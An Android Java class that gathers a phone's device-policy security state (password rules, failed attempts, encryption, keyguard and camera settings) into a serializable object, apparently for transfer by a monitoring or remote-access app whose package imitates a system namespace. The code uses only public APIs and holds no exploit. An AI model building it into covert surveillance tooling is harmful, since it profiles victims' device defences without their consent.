package Transfer;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.os.Build.VERSION;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;
import java.util.Arrays;

import static android.app.admin.DevicePolicyManager.PASSWORD_QUALITY_ALPHABETIC;
import static android.app.admin.DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC;
import static android.app.admin.DevicePolicyManager.PASSWORD_QUALITY_BIOMETRIC_WEAK;
import static android.app.admin.DevicePolicyManager.PASSWORD_QUALITY_COMPLEX;
import static android.app.admin.DevicePolicyManager.PASSWORD_QUALITY_NUMERIC;
import static android.app.admin.DevicePolicyManager.PASSWORD_QUALITY_NUMERIC_COMPLEX;
import static android.app.admin.DevicePolicyManager.PASSWORD_QUALITY_SOMETHING;
import static android.app.admin.DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED;

public class DeviceAdminInformation implements Serializable {

  public String ActiveAdmins;
  public boolean CameraDisabled;
  public int CurrentFailedPasswordAttempts;
  public String KeyguardDisabledFeatures;
  public int MaximumFailedPasswordsForWipe;
  public long MaximumTimeToLock;
  public long PasswordExpiration;
  public long PasswordExpirationTimeout;
  public int PasswordHistoryLength;
  public int PasswordMaximumLengthAlphabetic;
  public int PasswordMaximumLengthAlphanumeric;
  public int PasswordMaximumLengthBiometricWeak;
  public int PasswordMaximumLengthComplex;
  public int PasswordMaximumLengthNumeric;
  public int PasswordMaximumLengthNumericComplex;
  public int PasswordMaximumLengthSomething;
  public int PasswordMaximumLengthUnspecified;
  public int PasswordMinimumLength;
  public int PasswordMinimumLetters;
  public int PasswordMinimumLowerCase;
  public int PasswordMinimumNonLetter;
  public int PasswordMinimumNumeric;
  public int PasswordMinimumSymbols;
  public int PasswordMinimumUpperCase;
  public String PasswordQuality;
  public boolean ScreenCaptureDisabled;
  public boolean StorageEncryption;
  public String StorageEncryptionStatus;
  public boolean isActivePasswordSufficient;

  public DeviceAdminInformation() {
    try {
      DevicePolicyManager devicePolicyManager =
          (DevicePolicyManager) MyService.context.getSystemService(Context.DEVICE_POLICY_SERVICE);
      if (VERSION.SDK_INT >= 8) {
        String[] activeAdmins = new String[devicePolicyManager.getActiveAdmins().size()];
        for (int i = 0; i < activeAdmins.length; i++) {
          activeAdmins[i] = (devicePolicyManager.getActiveAdmins().get(i)).flattenToShortString();
        }
        ActiveAdmins = Arrays.toString(activeAdmins);

        CurrentFailedPasswordAttempts = devicePolicyManager.getCurrentFailedPasswordAttempts();
        MaximumFailedPasswordsForWipe =
            devicePolicyManager.getMaximumFailedPasswordsForWipe(MyService.componentName);
        MaximumTimeToLock = devicePolicyManager.getMaximumTimeToLock(MyService.componentName);
        PasswordMaximumLengthAlphabetic = devicePolicyManager.getPasswordMaximumLength(PASSWORD_QUALITY_ALPHABETIC);
        PasswordMaximumLengthAlphanumeric =
            devicePolicyManager.getPasswordMaximumLength(PASSWORD_QUALITY_ALPHANUMERIC);
        PasswordMaximumLengthBiometricWeak =
            devicePolicyManager.getPasswordMaximumLength(PASSWORD_QUALITY_BIOMETRIC_WEAK);
        PasswordMaximumLengthComplex = devicePolicyManager.getPasswordMaximumLength(PASSWORD_QUALITY_COMPLEX);
        PasswordMaximumLengthNumeric = devicePolicyManager.getPasswordMaximumLength(PASSWORD_QUALITY_NUMERIC);
        PasswordMaximumLengthNumericComplex =
            devicePolicyManager.getPasswordMaximumLength(PASSWORD_QUALITY_NUMERIC_COMPLEX);
        PasswordMaximumLengthSomething = devicePolicyManager.getPasswordMaximumLength(PASSWORD_QUALITY_SOMETHING);
        PasswordMaximumLengthUnspecified = devicePolicyManager.getPasswordMaximumLength(PASSWORD_QUALITY_UNSPECIFIED);
        PasswordMinimumLength =
            devicePolicyManager.getPasswordMinimumLength(MyService.componentName);

        switch (devicePolicyManager.getPasswordQuality(MyService.componentName)) {
          case PASSWORD_QUALITY_UNSPECIFIED:
            PasswordQuality = "Unspecified";
            break;
          case PASSWORD_QUALITY_BIOMETRIC_WEAK:
            PasswordQuality = "Biometric Weak";
            break;
          case PASSWORD_QUALITY_SOMETHING:
            PasswordQuality = "Something";
            break;
          case PASSWORD_QUALITY_NUMERIC:
            PasswordQuality = "Numeric";
            break;
          case PASSWORD_QUALITY_NUMERIC_COMPLEX:
            PasswordQuality = "Numeric Complex";
            break;
          case PASSWORD_QUALITY_ALPHABETIC:
            PasswordQuality = "Alphabetic";
            break;
          case PASSWORD_QUALITY_ALPHANUMERIC:
            PasswordQuality = "Alphanumeric";
            break;
          case PASSWORD_QUALITY_COMPLEX:
            PasswordQuality = "Complex";
            break;
        }
        isActivePasswordSufficient = devicePolicyManager.isActivePasswordSufficient();
      } else {
        ActiveAdmins = "N/A";
      }

      if (VERSION.SDK_INT >= 11) {
        PasswordExpiration =
            devicePolicyManager.getPasswordExpiration(MyService.componentName);
        PasswordExpirationTimeout =
            devicePolicyManager.getPasswordExpirationTimeout(MyService.componentName);
        PasswordHistoryLength =
            devicePolicyManager.getPasswordHistoryLength(MyService.componentName);
        PasswordMinimumLetters =
            devicePolicyManager.getPasswordMinimumLetters(MyService.componentName);
        PasswordMinimumLowerCase =
            devicePolicyManager.getPasswordMinimumLowerCase(MyService.componentName);
        PasswordMinimumNonLetter =
            devicePolicyManager.getPasswordMinimumNonLetter(MyService.componentName);
        PasswordMinimumNumeric =
            devicePolicyManager.getPasswordMinimumNumeric(MyService.componentName);
        PasswordMinimumSymbols =
            devicePolicyManager.getPasswordMinimumSymbols(MyService.componentName);
        PasswordMinimumUpperCase =
            devicePolicyManager.getPasswordMinimumUpperCase(MyService.componentName);
        StorageEncryption = devicePolicyManager.getStorageEncryption(MyService.componentName);

        switch (devicePolicyManager.getStorageEncryptionStatus()) {
          case 0:
            StorageEncryptionStatus = "Unsupported";
            break;
          case 1:
            StorageEncryptionStatus = "Inactive";
            break;
          case 2:
            StorageEncryptionStatus = "Activating";
            break;
          case 3:
            StorageEncryptionStatus = "Active";
            break;
        }
      }

      if (VERSION.SDK_INT >= 14) {
        CameraDisabled = devicePolicyManager.getCameraDisabled(MyService.componentName);
      }

      if (VERSION.SDK_INT >= 17) {
        switch (devicePolicyManager.getKeyguardDisabledFeatures(MyService.componentName)) {
          case 0:
            KeyguardDisabledFeatures = "None";
            break;
          case 1:
            KeyguardDisabledFeatures = "All Widgets";
            break;
          case 2:
            KeyguardDisabledFeatures = "Secure Camera";
            break;
          case 4:
            KeyguardDisabledFeatures = "Secure SystemNotification";
            break;
          case 8:
            KeyguardDisabledFeatures = "Unredacted SystemNotification";
            break;
          case 16:
            KeyguardDisabledFeatures = "Trust Agents";
            break;
          case 32:
            KeyguardDisabledFeatures = "Fingerprint";
            break;
          case Integer.MAX_VALUE:
            KeyguardDisabledFeatures = "All Features";
            break;
        }
      }

      if (VERSION.SDK_INT >= 21) {
        ScreenCaptureDisabled =
            devicePolicyManager.getScreenCaptureDisabled(MyService.componentName);
      }
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
